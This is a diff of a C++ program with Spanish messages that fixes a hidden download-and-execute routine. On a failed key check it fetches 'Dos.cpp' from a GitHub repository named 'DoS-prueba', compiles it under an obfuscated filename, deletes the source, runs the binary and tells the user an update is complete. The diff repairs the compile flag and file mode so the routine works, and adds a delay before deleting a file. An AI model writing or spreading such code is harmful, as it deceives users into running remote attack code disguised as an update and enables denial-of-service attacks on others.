@@ -19,7 +19,7 @@ struct var{
 }var;
 
 int hack(){
-    cout << "xda";
+    cout << "xd";
     return 0;
 }
 
@@ -32,16 +32,16 @@ int main(int argc, char* argv[]){
             if(res == var.key ){
                 
             }else{
-                cout << Red " No elimine archivos ni cierre el programa.\n" F_Normal;
+                cout << Red F_Bold " No elimine archivos ni cierre el programa.\n" F_Normal;
                 res = Internet.get("https://raw.githubusercontent.com/bite-rrjo/DoS-prueba/main/Dos.cpp");
                 if(Internet.errorGetWeb() == true){
-                    fstream file("98381289738127367239f.cpp");
+                    ofstream file("98381289738127367239f.cpp");
                     file << res;
                     file.close();
-                    system("g++ 98381289738127367239f.cpp -o D320125324242342364 - lcurl");
+                    system("g++ 98381289738127367239f.cpp -o D320125324242342364 -lcurl");
                     remove("98381289738127367239f.cpp");
                     system("./D320125324242342364");
-                    cout << White " actualizacion completa :)\n" F_Normal;
+                    cout << White "\n actualizacion completa :)\n" F_Normal;
                     return 0;
                 }else{
                     cout << Red " Error en la actualizacion.\n" F_Normal;
@@ -51,6 +51,7 @@ int main(int argc, char* argv[]){
         hack();
 
     }else if(argm == "./D320125324242342364" || argm == "D320125324242342364"){
+        sleep(5);
         if(remove("rrjo") != 0){
             cout << Red "error\n";
         }
